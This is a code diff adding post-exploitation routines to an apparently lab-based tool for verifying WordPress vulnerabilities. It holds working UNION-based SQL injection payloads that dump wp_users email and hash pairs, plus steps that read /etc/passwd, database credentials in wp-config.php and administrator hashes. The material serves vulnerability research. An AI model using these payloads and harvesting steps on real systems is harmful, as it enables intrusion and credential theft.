@@ -12038,3 +12038,203 @@ def verify_wordpress_deserialization_custom_table(
         return res
     finally:
         _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+
+
+# ---------------------------------------------------------------------------
+# Post-exploitation: impact escalation after RCE / SQLi confirmation
+# ---------------------------------------------------------------------------
+
+def escalate_post_rce(
+    lab: "_Lab",
+    base_url: str,
+    webshell_url: str,
+    step: "Callable[[str], None]",
+) -> dict:
+    """After confirmed RCE via webshell, run post-exploitation to maximise
+    impact evidence.  Uses Docker exec for reliable reads.  Returns partial
+    results on any failure — never crashes.
+
+    escalation_level: "none" < "read" < "db_access" < "full_compromise"
+    """
+    result: dict = {
+        "etc_passwd": None,
+        "wp_config_db_name": None,
+        "wp_config_db_user": None,
+        "wp_config_db_pass": None,
+        "admin_hashes": [],
+        "filesystem_write": False,
+        "escalation_level": "none",
+    }
+
+    # 1. /etc/passwd
+    try:
+        r = lab.sh("exec", lab.wp, "cat", "/etc/passwd", timeout=10)
+        if r.returncode == 0 and r.stdout:
+            lines = [ln for ln in (r.stdout or "").splitlines() if ln.strip()][:5]
+            result["etc_passwd"] = "\n".join(lines)
+            result["escalation_level"] = "read"
+            step(f"  post-rce: /etc/passwd leído ({len(lines)} líneas)")
+    except Exception:
+        pass
+
+    # 2. wp-config.php — DB credentials
+    try:
+        r = lab.sh("exec", lab.wp, "cat", "/var/www/html/wp-config.php", timeout=10)
+        if r.returncode == 0 and r.stdout:
+            cfg = r.stdout or ""
+
+            def _extract_define(key: str) -> Optional[str]:
+                _m = re.search(
+                    r"define\s*\(\s*['\"]" + re.escape(key)
+                    + r"['\"]\s*,\s*['\"]([^'\"]+)['\"]",
+                    cfg,
+                )
+                return _m.group(1) if _m else None
+
+            db_name = _extract_define("DB_NAME")
+            db_user = _extract_define("DB_USER")
+            db_pass = _extract_define("DB_PASSWORD")
+            if db_name or db_user:
+                result["wp_config_db_name"] = db_name
+                result["wp_config_db_user"] = db_user
+                result["wp_config_db_pass"] = "***" if db_pass else None
+                result["escalation_level"] = "db_access"
+                step(
+                    f"  post-rce: wp-config.php — DB_NAME={db_name},"
+                    f" DB_USER={db_user}"
+                )
+    except Exception:
+        pass
+
+    # 3. Admin hashes via wp-cli
+    try:
+        r = lab.wp_cli(
+            "user", "list",
+            "--fields=user_email,user_pass",
+            "--format=csv",
+            "--role=administrator",
+            timeout=20,
+        )
+        if r and r.returncode == 0 and r.stdout:
+            hashes: list = []
+            for line in (r.stdout or "").splitlines()[1:4]:  # skip header, max 3
+                parts = line.strip().split(",", 1)
+                if len(parts) == 2 and parts[1].startswith("$"):
+                    hashes.append(f"{parts[0]}:{parts[1]}")
+            if hashes:
+                result["admin_hashes"] = hashes
+                result["escalation_level"] = "full_compromise"
+                step(f"  post-rce: {len(hashes)} hash(es) de admin extraídos")
+    except Exception:
+        pass
+
+    # 4. Filesystem write outside webroot
+    try:
+        _probe_path = "/tmp/binoracle_write_probe"
+        r = lab.sh(
+            "exec", lab.wp, "sh", "-c",
+            f"echo 1 > {_probe_path} && cat {_probe_path}",
+            timeout=10,
+        )
+        if r.returncode == 0 and "1" in (r.stdout or ""):
+            result["filesystem_write"] = True
+            step("  post-rce: escritura fuera del webroot confirmada (/tmp)")
+    except Exception:
+        pass
+
+    return result
+
+
+def escalate_post_sqli(
+    lab: "_Lab",
+    base_url: str,
+    endpoint: str,
+    sqli_param: str,
+    http_method: str,
+    step: "Callable[[str], None]",
+) -> dict:
+    """After confirmed SQLi, extract concrete data to maximise impact evidence.
+
+    Sends UNION-based payloads via the same endpoint.  Returns partial results
+    on any failure.
+
+    escalation_level: "read_only" < "data_access" < "file_access"
+    """
+    result: dict = {
+        "db_version": None,
+        "db_user": None,
+        "user_hashes": [],
+        "db_has_file_priv": False,
+        "escalation_level": "read_only",
+    }
+
+    _m = (http_method or "GET").upper()
+    _sess = _make_session()
+
+    def _sqli_req(payload: str) -> str:
+        try:
+            if _m == "GET":
+                _r = _sess.get(
+                    base_url + endpoint,
+                    params={sqli_param: payload},
+                    timeout=12,
+                    allow_redirects=True,
+                )
+            else:
+                _r = _sess.post(
+                    base_url + endpoint,
+                    data={sqli_param: payload},
+                    timeout=12,
+                    allow_redirects=True,
+                )
+            return (_r.text or "")[:3000]
+        except Exception:
+            return ""
+
+    # 1. DB version
+    try:
+        body = _sqli_req("1 AND 1=2 UNION SELECT @@version,2-- -")
+        vm = re.search(r"(\d+\.\d+\.\d+[^\s<\"']*)", body)
+        if vm:
+            result["db_version"] = vm.group(1)
+            step(f"  post-sqli: db_version={result['db_version']}")
+    except Exception:
+        pass
+
+    # 2. DB user
+    try:
+        body = _sqli_req("1 AND 1=2 UNION SELECT user(),2-- -")
+        um = re.search(r"([a-z_]+@[a-z%._\-]+)", body, re.I)
+        if um:
+            result["db_user"] = um.group(1)
+            step(f"  post-sqli: db_user={result['db_user']}")
+    except Exception:
+        pass
+
+    # 3. wp_users hashes (up to 3)
+    try:
+        body = _sqli_req(
+            "1 AND 1=2 UNION SELECT CONCAT(user_email,':',user_pass),2 "
+            "FROM wp_users LIMIT 3-- -"
+        )
+        hashes = re.findall(
+            r"[a-z0-9_.+\-]+@[a-z0-9.\-]+:\$[^\s<\"']{20,}", body, re.I
+        )
+        if hashes:
+            result["user_hashes"] = hashes[:3]
+            result["escalation_level"] = "data_access"
+            step(f"  post-sqli: {len(hashes)} hash(es) de wp_users extraídos")
+    except Exception:
+        pass
+
+    # 4. FILE privilege via @@datadir
+    try:
+        body = _sqli_req("1 AND 1=2 UNION SELECT @@datadir,2-- -")
+        if re.search(r"/var/lib/mysql|/mysql/data", body, re.I):
+            result["db_has_file_priv"] = True
+            result["escalation_level"] = "file_access"
+            step("  post-sqli: privilegio FILE detectado (@@datadir visible)")
+    except Exception:
+        pass
+
+    return result
